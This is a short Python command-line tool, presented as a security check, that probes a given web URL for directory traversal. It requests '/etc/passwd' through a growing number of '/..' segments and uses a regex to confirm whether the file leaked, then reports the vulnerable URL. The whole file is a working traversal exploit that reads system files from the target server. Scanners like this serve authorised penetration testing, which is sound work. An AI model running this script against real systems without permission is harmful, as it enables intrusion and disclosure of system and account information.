# -*- encoding: utf-8 -*-

import sys, time, re, argparse, requests

num_slashes = 10

def is_etc_passwd(text):
    passwd_regex = r"^[^:]+:[x*]:\d+:\d+:[^:]*:[^:]*:[^:]*$"   
    return bool(re.match(passwd_regex, text))

def generate_urls(base_url, num_slashes):
    base_url = base_url.strip()
    base_url = base_url[:-1] if base_url.endswith('/') else base_url
    for i in range(0, num_slashes):
        yield f"{base_url}{i * "/.."}/etc/passwd"

def main():
    parser = argparse.ArgumentParser(prog="Web Exploit Traversal", description="This tool is designed to perform a security check for web exploit traversal.")
    parser.add_argument("--url", type=str, help="The URL to check.", required=True)
    parser.add_argument("--num_slashes", type=int, default=num_slashes, help=f"Number of slashes (default: {num_slashes})")
    args = parser.parse_args()

    try:    
        found = False
        for i, url in enumerate(generate_urls(args.url, args.num_slashes)):
            resp = requests.get(url)
            if resp.status_code == 200:
                for line in resp.text.splitlines():
                    if is_etc_passwd(line):
                        found = True
                        break
            if not found:
                sys.stdout.write(f"Checking {i + 1}/{args.num_slashes}.\r")
                sys.stdout.flush()
            else: break
            time.sleep(0.5)

        if found:
            print(f"Found at '{url}'")
        else:
            print("Not Found        ")

        print("Finished!")
    except (Exception, KeyboardInterrupt) as e: print(e)
    return

if __name__ == "__main__": main()